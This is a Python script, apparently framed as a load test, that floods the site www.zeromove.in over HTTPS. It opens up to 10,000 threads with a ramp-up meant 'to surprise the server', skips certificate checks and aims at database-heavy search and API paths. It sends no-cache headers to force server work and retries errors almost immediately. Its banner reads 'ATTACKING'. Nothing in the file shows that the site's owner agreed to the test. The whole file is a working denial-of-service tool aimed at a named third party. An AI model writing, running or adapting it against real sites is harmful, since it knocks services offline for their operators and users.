import socket
import ssl
import threading
import random
import time
import statistics
import sys
from collections import Counter

# --- TARGET CONFIG ---
TARGET_HOST = 'www.zeromove.in'
TARGET_PORT = 443
MAX_THREADS = 10000       # Increased for "Stronger" test
RAMP_UP_TIME = 20      # Faster ramp-up to surprise the server
TEST_DURATION = 120    

# --- PATH WEIGHTING (Simulating heavy database hits) ---
# Hits search and API more often to trigger backend processing
PATHS = [
    ('/', 0.2), 
    ('/search?q=' + str(random.randint(100, 999)), 0.5), # Heavy DB Query
    ('/api/v1/products/filter?sort=price_desc', 0.3)      # Complex Logic
]

# --- RELEVANT STATS ---
lock = threading.Lock()
stats = {'reqs': 0, 'errs': 0, 'latencies': [], 'codes': Counter()}
stop_event = threading.Event()

def get_path():
    p, w = zip(*PATHS)
    return random.choices(p, weights=w)[0]

def worker(ip):
    context = ssl.create_default_context()
    # Bypass certificate verification for raw stress testing if needed
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while not stop_event.is_set():
        try:
            with socket.create_connection((ip, TARGET_PORT), timeout=4) as sock:
                with context.wrap_socket(sock, server_hostname=TARGET_HOST) as ssock:
                    
                    # Connection Multiplexing (Send 10 requests per 1 connection)
                    for _ in range(10):
                        if stop_event.is_set(): break
                        
                        path = get_path()
                        # Bloated headers to stress the HTTP Parser
                        request = (
                            f"GET {path} HTTP/1.1\r\n"
                            f"Host: {TARGET_HOST}\r\n"
                            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0\r\n"
                            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8\r\n"
                            f"Cache-Control: no-cache\r\n" # FORCES SERVER TO WORK
                            f"Pragma: no-cache\r\n"
                            f"Connection: keep-alive\r\n\r\n"
                        ).encode('ascii')

                        start = time.perf_counter()
                        ssock.sendall(request)
                        
                        # We only need the header to confirm success
                        response = ssock.recv(1024) 
                        end = time.perf_counter()
                        
                        latency = end - start
                        status = response.split(b'\r\n')[0].decode(errors='ignore')

                        with lock:
                            stats['reqs'] += 1
                            stats['latencies'].append(latency)
                            stats['codes'][status[:15]] += 1

        except Exception:
            with lock: stats['errs'] += 1
            # Aggressive retry: small sleep instead of a long back-off
            time.sleep(0.1)

def logger():
    start = time.time()
    while not stop_event.is_set():
        time.sleep(1)
        elapsed = time.time() - start
        with lock:
            if stats['latencies']:
                avg = (sum(stats['latencies']) / len(stats['latencies'])) * 1000
                p99 = statistics.quantiles(stats['latencies'], n=100)[98] * 1000 if len(stats['latencies']) > 100 else 0
                print(f"[{int(elapsed)}s] Sent: {stats['reqs']} | Errors: {stats['errs']} | Avg: {avg:.1f}ms | p99: {p99:.1f}ms", end='\r')

def main():
    try:
        target_ip = socket.gethostbyname(TARGET_HOST)
    except socket.gaierror:
        print("[!] DNS Resolution Failed.")
        return

    print(f"[*] ATTACKING: {TARGET_HOST} | THREADS: {MAX_THREADS} | MODE: STRESS+KEEP-ALIVE")
    
    threading.Thread(target=logger, daemon=True).start()

    threads = []
    for i in range(MAX_THREADS):
        if stop_event.is_set(): break
        t = threading.Thread(target=worker, args=(target_ip,))
        t.daemon = True
        t.start()
        threads.append(t)
        # Fast Ramp-up
        time.sleep(RAMP_UP_TIME / MAX_THREADS)

    try:
        time.sleep(TEST_DURATION)
    except KeyboardInterrupt:
        pass
    
    stop_event.set()
    print("\n\n[*] TEST COMPLETE. FINAL STATUS CODES:")
    for code, count in stats['codes'].items():
        print(f" -> {code}: {count}")

if __name__ == "__main__":
    main()